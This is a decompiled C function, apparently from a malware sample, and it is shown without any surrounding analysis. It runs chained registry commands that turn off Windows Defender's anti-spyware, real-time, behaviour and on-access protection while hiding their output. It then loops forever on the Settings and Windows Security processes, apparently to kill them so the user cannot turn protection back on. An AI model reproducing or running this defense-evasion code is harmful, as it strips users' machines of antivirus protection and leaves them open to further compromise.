void FUN_140011c70(void)

{
  FUN_14000ff20("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1",
                60000);
  do {
    FUN_140010570("SystemSettings.exe");
    FUN_140010570("SecurityHealthService.exe");
    FUN_140010570("SecHealthUI.exe");
    Sleep(500);
  } while( true );
}
